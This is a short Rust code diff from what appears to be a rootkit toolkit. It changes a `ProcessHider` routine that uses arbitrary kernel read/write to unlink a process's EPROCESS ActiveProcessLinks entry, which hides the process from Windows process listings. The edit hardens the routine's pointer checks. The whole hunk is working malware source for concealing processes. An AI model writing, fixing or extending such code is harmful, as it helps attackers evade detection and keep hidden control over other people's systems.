@@ -85,8 +85,8 @@ impl ProcessHider {
         let link_kva = eprocess_kva + offsets.active_process_links;
         let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
         let blink = krw.kread_u64(link_kva + 8).map_err(KitError::from)? as usize;
-        if flink == 0 || blink == 0 {
-            return Err(KitError::UnsupportedPosture("ActiveProcessLinks is zero"));
+        if flink < 0xFFFF_8000_0000_0000 || blink < 0xFFFF_8000_0000_0000 {
+            return Err(KitError::UnsupportedPosture("ActiveProcessLinks: non-canonical pointer"));
         }
         // blink->Flink = flink ; flink->Blink = blink
         krw.kwrite_u64(blink, flink as u64)
